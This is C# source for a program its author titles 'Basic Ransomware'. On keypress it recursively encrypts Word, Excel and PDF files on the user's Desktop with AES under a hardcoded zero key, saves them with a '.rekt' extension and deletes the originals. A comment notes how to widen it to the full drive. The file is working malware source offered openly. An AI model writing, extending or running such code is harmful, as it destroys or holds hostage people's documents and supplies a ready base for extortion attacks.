using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;

namespace BasicRansomware
{
    internal static class Program
    {
        private static readonly byte[] key = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; //default value, you can change
        private static readonly byte[] iv = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; //default value, you can change

        private static readonly List<string> extensionTypes = new List<string>()
        {
       //   ".exe"
            ".docx",
            ".doc",
            ".pdf",
       //     ".cs",
            ".xlsx",
            ".xls",
        };
        private static void Main()
        {
            Console.Title = "Basic Ransomware - Yen Lamire";
            Console.WriteLine("Enter what to do:\n1 - Encrypt\n2 - Decrypt");
            Console.WriteLine();
            if (Console.ReadKey(true).KeyChar == '1')
            {
                foreach (var files in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "*.*", SearchOption.AllDirectories)) //can be easily changed onto full drive, (not doing shit i dont wanna get fucced)
                {
                    var fi = new FileInfo(files); //Might be bad for performance
                    if (!extensionTypes.Contains(fi.Extension)) continue;

                    File.WriteAllBytes(files + ".rekt", AesCryptographyService.Encrypt(File.ReadAllBytes(files), key, iv));
                    fi.Delete();
                }
            }
            else
            {
                foreach (var files in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "*.*", SearchOption.AllDirectories)) //can be easily changed onto full drive, (not doing shit i dont wanna get fucced)
                {
                    var fi = new FileInfo(files); //Might be bad for performance
                    if (fi.Extension != ".rekt") continue;

                    File.WriteAllBytes(files.Replace(".rekt", ""), AesCryptographyService.Decrypt(File.ReadAllBytes(files), key, iv));
                    fi.Delete();
                }
            }

        }
    }
    /// <summary>
    /// From : https://stackoverflow.com/questions/53653510/c-sharp-aes-encryption-byte-array
    /// </summary>
    public static class AesCryptographyService
    {
        public static byte[] Encrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 128;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;

                aes.Key = key;
                aes.IV = iv;

                using (var encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(data, encryptor);
                }
            }
        }

        public static byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 128;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;

                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(data, decryptor);
                }
            }
        }

        private static byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }
    }
}
